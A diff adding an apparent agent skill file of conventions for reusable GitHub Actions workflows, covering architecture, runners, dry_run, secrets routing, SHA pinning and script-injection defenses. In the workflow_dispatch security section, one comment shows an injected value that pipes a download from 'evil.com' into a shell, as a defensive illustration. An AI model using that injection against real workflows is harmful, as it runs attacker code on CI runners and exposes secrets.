@@ -1,0 +1,447 @@
+---
+name: workflow
+description: >-
+  Rules and conventions for reusable workflows under .github/workflows/. Load before adding a workflow or changing its inputs, jobs or secrets — covers the caller/workflow/composite architecture, runner policy, the dry_run pattern, secrets routing and the workflow_dispatch injection rule.
+---
+
+# Reusable Workflows — Rules & Conventions
+
+Use these rules whenever creating or editing a reusable workflow in `.github/workflows/`.
+
+## Before you create anything
+
+**Step 1 — Check if it already exists in this repo**
+
+Search `.github/workflows/` before starting. If a workflow already covers the same pipeline:
+
+- Summarize what the existing workflow does, its jobs, inputs, and secrets
+- Identify the gap between the existing behavior and the new requirement
+- Propose an **adaptation plan** (add a job, add an input, expose a new secret) instead of creating a new workflow file
+
+**Step 2 — Check the GitHub Actions Marketplace first**
+
+Before implementing custom steps inside a workflow, search the [Marketplace](https://github.com/marketplace?type=actions) for actions that already solve the problem:
+
+- Prefer a well-maintained action over custom shell scripting for non-trivial logic
+- If the action needs wrapping (normalization, extra steps), create a composite in `src/` and call it from the workflow — don't inline complex shell in the workflow itself
+- **Third-party actions (outside `LerianStudio` org) must be pinned by commit SHA**, not by tag — add a `# vX.Y.Z` comment for readability (e.g., `uses: actions/checkout@abc123 # v6`). Tags are mutable and can be force-pushed by upstream maintainers. Dependabot proposes SHA bumps automatically.
+- `LerianStudio/*` actions are pinned by **release tag** (`@v1.2.3`) or branch (`@develop` for testing)
+- Never use `@main` or `@master` for third-party actions
+- Document in `docs/<workflow-name>.md` why that action was chosen
+
+Only implement from scratch when no suitable action exists or when existing ones don't meet security or customization requirements.
+
+---
+
+## Architecture model
+
+```
+Caller repository workflow         ← minimal entrypoint: triggers + secrets only
+         ↓
+Reusable workflow                  ← orchestrates jobs, runners, secrets
+(.github/workflows/*.yml)
+         ↓
+Composite action                   ← encapsulates reusable steps
+(src/<capability>/<name>/action.yml)
+```
+
+**Rules:**
+- Caller workflows must contain only triggers and job references — no business logic
+- Reusable workflows must orchestrate jobs and route secrets
+- Composite actions must encapsulate steps for a single responsibility
+
+**Example: Go CI pipeline**
+
+```
+caller: .github/workflows/ci.yml  (on: push)
+    ↓
+reusable: go-ci.yml
+    ↓ job: ci
+        → src/setup/setup-go      (install Go, restore cache)
+        → src/build/build-go      (compile, vet)
+        → src/test/test-go        (run tests, upload coverage)
+        → src/build/docker-build  (build and push image)
+```
+
+## When to use each
+
+| Need | Use |
+|---|---|
+| Standardize a full CI/CD pipeline across repos | Reusable workflow |
+| Reuse a group of steps inside a job | Composite action |
+| Share setup / build / lint / test logic | Composite action |
+| Manage multiple jobs or runners | Reusable workflow only |
+| Route secrets to jobs | Reusable workflow only |
+
+## self-* workflows (entrypoints for this repo)
+
+Files prefixed with `self-` are **thin entrypoints** for this repository's own automation — not reusable workflows.
+
+- **Must NOT have `workflow_call`** — not offered to external callers
+- **`dry_run` is not required** — omit it unless the workflow performs destructive operations
+- **When `dry_run` is present**, it must be: `type: boolean`, `required: false`, `default: true` for destructive ops (delete, purge) or `default: false` for non-destructive ops (sync, notify)
+- Must call the corresponding reusable workflow via local path (`./.github/workflows/<name>.yml`)
+- Triggers are repo-specific: `push`, `schedule`, `pull_request`, `workflow_dispatch`
+- Must not contain business logic
+
+```yaml
+# ✅ Correct self-* structure
+name: Self — Labels Sync
+on:
+  push:
+    branches: [main]
+    paths: [".github/labels.yml"]
+  workflow_dispatch:
+jobs:
+  sync:
+    uses: ./.github/workflows/labels-sync.yml
+    secrets: inherit
+```
+
+---
+
+## Runner
+
+All jobs in reusable workflows must use `blacksmith-4vcpu-ubuntu-2404` as the runner:
+
+```yaml
+jobs:
+  build:
+    runs-on: blacksmith-4vcpu-ubuntu-2404   # ✅ required runner
+    # ...
+```
+
+```yaml
+# ❌ Never use other runners
+runs-on: ubuntu-latest
+runs-on: ubuntu-22.04
+runs-on: self-hosted
+```
+
+## Workflow structure
+
+Every reusable workflow must:
+- support `workflow_call` (for external callers)
+- **must NOT have `workflow_dispatch`** — manual testing belongs in `self-*` entrypoints (see [script injection risk](#script-injection--workflow_dispatch))
+- expose explicit `inputs` — never rely on implicit context
+- **always include a `dry_run` input** (`type: boolean`, `default: false`)
+
+```yaml
+on:
+  workflow_call:
+    inputs:
+      environment:
+        required: true
+        type: string
+      dry_run:
+        description: Preview changes without applying them
+        required: false
+        type: boolean
+        default: false
+    secrets:
+      DEPLOY_TOKEN:
+        required: true
+```
+
+## Configurability — expose composite toggles as workflow inputs
+
+Reusable workflows act as a **configuration bridge** between callers and composites. Every optional feature in a composite must be surfaceable as a workflow input, so callers can enable or disable it without touching the composite.
+
+**Rules:**
+- For every optional feature in a composite (e.g. `enable-recommendations`), declare a matching `workflow_call` input
+- Pass the workflow input explicitly to the composite via `with:`
+- Use `if: inputs.enable_xxx` at the **step or job level** in the workflow to skip the composite call entirely when disabled — never gate this inside the composite itself
+- Input naming: workflow inputs use `snake_case`, composite inputs use `kebab-case`
+
+```yaml
+on:
+  workflow_call:
+    inputs:
+      enable_docker_scout:
+        description: Run Docker Scout vulnerability scan
+        required: false
+        type: boolean
+        default: true
+      enable_docker_scout_recommendations:
+        description: Include Docker Scout recommendations in the PR comment
+        required: false
+        type: boolean
+        default: true
+
+jobs:
+  scan:
+    steps:
+      - name: Docker Scout
+        if: inputs.enable_docker_scout            # skip entire step when disabled
+        uses: LerianStudio/shared-workflows-public/src/security/docker-scout@v1.2.3
+        with:
+          enable-recommendations: ${{ inputs.enable_docker_scout_recommendations }}
+```
+
+## dry_run pattern
+
+The two modes have opposite goals — design them accordingly:
+
+| Mode | Goal | Log style |
+|---|---|---|
+| `dry_run: true` | Validate before applying | Verbose — print everything |
+| `dry_run: false` | Apply cleanly | Silent — only errors and summaries |
+
+```yaml
+# dry_run: true — verbose, annotated, tool debug flags on
+- name: Dry run summary
+  if: ${{ inputs.dry_run }}
+  run: |
+    echo "::notice::DRY RUN — no changes will be applied"
+    echo "  environment : ${{ inputs.environment }}"
+    echo "  target      : ${{ steps.resolve.outputs.target }}"
+    echo "  version     : ${{ steps.resolve.outputs.version }}"
+
+- name: Preview (dry run)
+  if: ${{ inputs.dry_run }}
+  run: helm upgrade --install --dry-run --debug ...
+
+# dry_run: false — clean, no extra echo, output only on failure
+- name: Apply
+  if: ${{ !inputs.dry_run }}
+  run: helm upgrade --install ...
+```
+
+**Dry run (`true`):** use `::notice::` annotations, print all resolved values, enable tool-native flags (`--dry-run --debug`, `--check`, `--plan`, `--diff`), never skip silently.
+
+**Real run (`false`):** no extra `echo`, no debug flags, let failures surface via exit codes, one `::notice::` summary on success at most.
+
+**Exception — `continue-on-error` steps must annotate their own failures.** The
+rule above leans on the exit code to carry a failure. A step that deliberately
+swallows its exit code has no such channel, so a failure there is invisible: the
+job reports success and nobody looks at the log. Emit `::warning::` on the
+failure path.
+
+This is not hypothetical. `pr-validation.yml`'s breaking-change comment took a
+403 on every run from 2026-08-06 and reported success each time, because the
+step was `continue-on-error` and said nothing. The comment it posts explains to
+an author what to add; for two months it never arrived, and the only symptom was
+a blocking check failing with no explanation.
+
+Gate the annotation on the failure itself (`if: steps.<id>.outcome == 'failure'`)
+so a successful run stays silent.
+
+## Step section titles
+
+When a job has more than one logical group of steps, separate each group with a titled section comment:
+
+```yaml
+      # ----------------- Security Scans -----------------
+      - name: Trivy Secret Scan
+        ...
+
+      # ----------------- Docker Scout Analysis -----------------
+      - name: Docker Scout
+        ...
+
+      # ----------------- PR Comment with Security Findings -----------------
+      - name: Post Results to PR
+        ...
+```
+
+**Rules:**
+- Format: `# ----------------- Title -----------------` (exact spacing)
+- Add when there are 2+ logical groups in the same job
+- Title must be short and action-oriented (e.g. "Build & Push", "Notifications")
+- Place the comment immediately before the first step of the group — no blank line between comment and step
+
+## Composite action references (critical)
+
+In reusable workflows (`workflow_call`), `uses: ./path` resolves to the **caller's workspace**, not this repository. This means `./src/...` only works when the caller IS this repo (i.e., `self-*` workflows).
+
+- **Workflows called by external repos** — must use an external ref pinned to a release tag:
+  ```yaml
+  uses: LerianStudio/shared-workflows-public/src/notify/discord-release@v1.2.3  # ✅ pinned
+  uses: LerianStudio/shared-workflows-public/src/notify/discord-release@develop # ⚠️ testing only
+  uses: ./src/notify/discord-release  # ❌ resolves to caller's workspace, will fail
+  ```
+- **`self-*` workflows (internal only)** — may use local path for reusable workflows only (not composites):
+  ```yaml
+  uses: ./.github/workflows/labels-sync.yml  # ✅ caller is this repo
+  ```
+
+## Secrets management
+
+```yaml
+# Caller
+jobs:
+  deploy:
+    uses: LerianStudio/shared-workflows-public/.github/workflows/deploy.yml@v1.2.3
+    secrets:
+      DOCKER_TOKEN: ${{ secrets.DOCKER_TOKEN }}
+
+# Reusable workflow — declare but never set a value
+on:
+  workflow_call:
+    secrets:
+      DOCKER_TOKEN:
+        required: true
+```
+
+## Naming conventions
+
+```
+✅  go-ci.yml   build-node.yml   labels-sync.yml   helm-deploy.yml
+❌  workflow.yml   pipeline.yml   ci.yml   action.yml
+```
+
+Always use `.yml` extension — never `.yaml`:
+
+```
+✅  go-ci.yml   action.yml   labels.yml   dependabot.yml
+❌  go-ci.yaml  action.yaml  labels.yaml
+```
+
+## Documentation naming
+
+The doc file in `docs/` must have the **exact same name** as the workflow file, with `.md` extension, and must start with the Lerian branding header:
+
+```markdown
+<table border="0" cellspacing="0" cellpadding="0">
+  <tr>
+    <td><img src="https://github.com/LerianStudio.png" width="72" alt="Lerian" /></td>
+    <td><h1>workflow-name</h1></td>
+  </tr>
+</table>
+```
+
+```
+.github/workflows/go-ci.yml        → docs/go-ci.md          ✅
+.github/workflows/go-ci.yml        → docs/go-ci-workflow.md  ❌
+.github/workflows/labels-sync.yml  → docs/labels-sync.md    ✅
+```
+
+Every new reusable workflow must have a corresponding `docs/<workflow-name>.md`.
+
+### Usage example ref policy
+
+Examples in `docs/` must never use `@main`. Use the correct ref for each context:
+
+```yaml
+# ✅ Testing — point to develop or feature branch
+uses: LerianStudio/shared-workflows-public/.github/workflows/go-ci.yml@develop
+uses: LerianStudio/shared-workflows-public/.github/workflows/go-ci.yml@feat/my-branch
+
+# ✅ Production — always a pinned stable version
+uses: LerianStudio/shared-workflows-public/.github/workflows/go-ci.yml@v1.2.3
+
+# ❌ Never in examples
+uses: LerianStudio/shared-workflows-public/.github/workflows/go-ci.yml@main
+```
+
+## Anti-patterns
+
+```yaml
+# ❌ Monolithic composite — does setup + build + test + deploy in one action
+src/go-ci/action.yml
+
+# ❌ Multi-language composite — couples runtimes
+src/build/build-all/action.yml
+
+# ❌ Orchestration inside composite
+runs:
+  using: composite
+  jobs:          # invalid — composites have steps, not jobs
+    build: ...
+
+# ❌ Local path for composite in a workflow called by external repos
+uses: ./src/setup-go  # resolves to caller's workspace, not this repo
+
+# ❌ Mutable ref on third-party actions
+uses: some-action/tool@main
+
+# ❌ Third-party action pinned by tag (tags are mutable)
+uses: actions/checkout@v6
+
+# ✅ Third-party action pinned by commit SHA
+uses: actions/checkout@abc123def456 # v6
+```
+
+## Security rules
+
+- **Third-party actions (outside `LerianStudio` org) must be pinned by commit SHA** — tags are mutable and can be force-pushed. Add a `# vX.Y.Z` comment for readability. Dependabot keeps SHA pins updated automatically.
+- `LerianStudio/*` actions use release tags (`@v1.2.3`) — no SHA pinning needed for org-owned actions
+- Never use `@main` or `@master` for third-party actions
+- Never interpolate untrusted user input directly into `run:` commands
+- Never print secrets via `echo`, env dumps, or step summaries
+- Complex conditional logic belongs in the workflow, not in composites
+
+### Script injection & `workflow_dispatch`
+
+`workflow_dispatch` inputs are **user-controlled free-text** — they are a script injection vector when interpolated into `run:` blocks, `github-script`, or any expression context.
+
+**Why reusable workflows must NOT have `workflow_dispatch`:**
+
+1. **Attack surface** — any repo collaborator can trigger the workflow with arbitrary input values. If those values reach a `run:` step via `${{ inputs.xxx }}`, an attacker can inject shell commands.
+2. **Redundancy** — `self-*` entrypoints already provide `workflow_dispatch` with controlled, repo-specific defaults. Adding it to the reusable workflow duplicates the trigger surface without added value.
+3. **Input type mismatch** — `workflow_dispatch` inputs are always strings (even booleans become `"true"`/`"false"`), causing subtle type bugs when the same input is `type: boolean` under `workflow_call`.
+
+```yaml
+# ❌ Reusable workflow with workflow_dispatch — injection risk + type mismatch
+on:
+  workflow_call:
+    inputs:
+      environment:
+        type: string
+  workflow_dispatch:
+    inputs:
+      environment:        # string — attacker can inject: "; curl evil.com | sh"
+        type: string
+
+# ✅ Reusable workflow — workflow_call only
+on:
+  workflow_call:
+    inputs:
+      environment:
+        type: string
+
+# ✅ self-* entrypoint provides the manual trigger with safe defaults
+name: Self — Deploy
+on:
+  workflow_dispatch:
+    inputs:
+      environment:
+        type: choice           # choice, not free-text — no injection
+        options: [staging, production]
+jobs:
+  deploy:
+    uses: ./.github/workflows/deploy.yml
+    with:
+      environment: ${{ inputs.environment }}
+    secrets: inherit
+```
+
+**When `workflow_dispatch` is allowed on a reusable workflow:**
+
+Only when **all** of the following are true:
+- The workflow is **not consumed by external repos** (internal-only)
+- Every `workflow_dispatch` input uses `type: choice` or `type: boolean` — **never free-text `type: string`**
+- No input value is interpolated into `run:` blocks — only into `with:` parameters of trusted actions
+- The decision is documented with a `# Security: workflow_dispatch approved — <reason>` comment
+
+### Reserved names — never use as custom secret or input names
+
+Never declare secrets or inputs using GitHub's reserved prefixes — they break jobs silently:
+
+```yaml
+# ❌ Breaks jobs — GITHUB_TOKEN is provided automatically, cannot be declared as a named secret
+on:
+  workflow_call:
+    secrets:
+      GITHUB_TOKEN:   # reserved
+        required: true
+
+# ✅ Use a distinct name for custom tokens
+on:
+  workflow_call:
+    secrets:
+      MANAGE_TOKEN:
+        required: false
+```
+
+Reserved prefixes: `GITHUB_*`, `ACTIONS_*`, `RUNNER_*` — never use as custom secret, input, or env var names.
